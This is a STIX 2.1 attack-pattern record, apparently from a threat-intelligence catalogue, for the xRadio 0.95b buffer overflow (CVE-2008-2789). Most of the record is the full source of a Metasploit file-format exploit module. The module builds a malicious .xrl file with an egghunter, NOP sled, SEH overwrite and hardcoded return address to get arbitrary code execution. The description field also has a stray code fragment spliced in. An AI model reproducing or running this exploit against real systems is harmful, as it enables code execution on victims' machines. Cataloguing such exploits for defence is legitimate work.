{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--feed4f25-a99c-4b24-83bc-cb3742395abb",
    "created": "2024-08-14T16:37:05.558751Z",
    "modified": "2024-08-14T16:37:05.558755Z",
    "name": "xRadio 0.95b Buffer Overflow",
    "description": " This module exploits a buffer overflow in xRadio 0.95b. Using the application to import a specially crafted xrl file a buffer overflow occurs allowing arbitrary code execution.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/xradio_xrl_sehbof.rb",
            "external_id": "xradio_xrl_sehbof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2789"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'xRadio 0.95b Buffer Overflow',\n      'Description'     => %q{\n        This module exploits a buffer overflow in xRadio 0.95b.\n        Using the application to import a specially crafted xrl file,\n        a buffer overflow occurs allowing arbitrary code execution.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'b0telh0 <me[at]gotgeek.com.br>',\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2008-2789' ],\n          [ 'BID', '46290' ],\n          [ 'EDB', '16141' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'seh',\n          'DisablePayloadHandler' => true\n        },\n      'Platform'        => 'win',\n      'Payload'         =>\n        {\n          'Space' => 1000,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'StackAdjustment' => -3500\n        },\n      'Targets'         =>\n        [\n          [ 'Windows Universal',\n            {\n              # pop eax - pop ebx - ret xradio.exe\n              'Ret' => 0x0047E282\n            }\n          ],\n        ],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2011-02-08',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'The file name.', 'msf.xrl'])\n      ])\n\n  end\n\n  def exploit\n    eggoptions =\n    {\n      :checksum => true,\n      :eggtag => 'w00t'\n    }\n\n    hunter,egg = generate_egghunter(payload.encoded, eggoptions)\n\n    buffer =  rand_text_alpha_upper(4066-egg.length)\n    buffer << egg\n    buffer << make_nops(10)\n    buffer << hunter\n    buffer << \"\\xeb\\xd8\\xff\\xff\"      # nseh  jmp back 40 bytes\n    buffer << [target.ret].pack('V')  # seh\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(buffer)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-02-08",
    "x_mitre_platforms": [
        "win'"
    ]
}